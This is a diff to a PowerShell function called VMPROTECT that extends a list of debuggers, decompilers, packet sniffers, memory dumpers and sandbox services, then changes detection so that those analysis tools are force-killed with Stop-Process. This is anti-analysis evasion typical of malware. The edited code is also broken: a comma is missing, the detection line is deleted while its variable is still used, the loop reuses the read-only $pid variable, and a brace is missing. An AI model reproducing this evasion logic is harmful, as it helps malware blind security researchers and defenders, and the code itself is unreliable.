@@ -131,6 +131,52 @@ function VMPROTECT {
         StopBatch   
     }	
     $processnames = @(
+        "fiddler",
+        "charles",
+        "wireshark",
+        "burp",
+        "megadumper",
+        "de4dot",
+        "De4Net","De4Net-x86",
+        "dnspy",
+        "ilspy",
+        "cawkvm",
+        "solarwinds",
+        "paessler",
+        "cpacket",
+        "Ethereal",
+        "sectools",
+        "riverbed",
+        "tcpdump",
+        "EtherApe",
+        "Fiddler",
+        "telerik",
+        "glasswire",
+        "HTTPDebuggerSvc",
+        "HTTPDebuggerUI",
+        "intercepter",
+        "snpa",
+        "dumcap",
+        "comview",
+        "netcheat",
+        "cheat",
+        "winpcap",
+        "ExtremeDumper",
+        "extremeDumper",
+        "ExtremeDumper-x86",
+        "extremeDumper-x86",
+        "MegaDumper",
+        "reflector",
+        "codecracker",
+        "cheatengine",
+        "x32dbg",
+        "x64dbg",
+        "ida -",
+        "simpleassembly",
+        "peek",
+        "httpanalyzer",
+        "httpdebug",
+        "ProcessHacker"
         "autoruns",
         "autoruns64",
         "autorunsc",
@@ -140,7 +186,6 @@ function VMPROTECT {
         "etwdump",
         "efsdump",
         "fakenet",
-        "fiddler",
         "filemon",
         "hookexplorer",
         "httpdebugger",
@@ -164,6 +209,7 @@ function VMPROTECT {
         "qemu-ga",
         "qga",
         "regmon",
+        "hxd",
         "resourcehacker",
         "sbiesvc",
         "sandman",
@@ -172,7 +218,6 @@ function VMPROTECT {
         "sysanalyzer",
         "sysinspector",
         "sysmon",
-        "tcpdump",
         "tcpview",
         "tcpview64",
         "udpdump",
@@ -186,16 +231,13 @@ function VMPROTECT {
         "vmwareuser",
         "vt-windows-event-stream",
         "windbg",
-        "wireshark",
-        "x32dbg",
-        "x64dbg",
         "VmRemoteGuest",
         "Sysmon64",
         "xenservice"
     )
-    $detectedProcesses = gps -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
-    if ($null -ne $detectedProcesses) {
-        StopBatch
+    if ($detectedProcesses) {
+        foreach ($pid in $detectedProcesses) {
+            Stop-Process -Id $pid -Force
     }
 
     if ($null -eq $detectedProcesses) {	
